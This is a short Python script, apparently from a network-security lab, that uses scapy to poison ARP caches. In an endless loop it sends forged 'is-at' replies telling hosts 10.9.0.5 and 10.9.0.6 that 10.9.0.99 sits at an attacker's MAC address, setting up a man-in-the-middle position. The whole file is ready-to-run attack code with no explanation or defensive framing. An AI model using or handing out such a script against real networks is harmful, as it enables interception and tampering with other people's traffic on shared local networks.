#!/usr/bin/env python3
from scapy.all import *

def arp_poison(target_ip, host_ip, attacker_mac):
    arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip, hwsrc=attacker_mac, op="is-at")
    send(arp_response, verbose=0)

attacker_mac = "02:42:18:55:8d:f1"
host_c_ip = "10.9.0.99"

targets = [("10.9.0.5", "02:42:0a:09:00:05"), ("10.9.0.6", "02:42:0a:09:00:06")]

while True:
    for target_ip, _ in targets:
        arp_poison(target_ip, host_c_ip, attacker_mac)
    time.sleep(10)

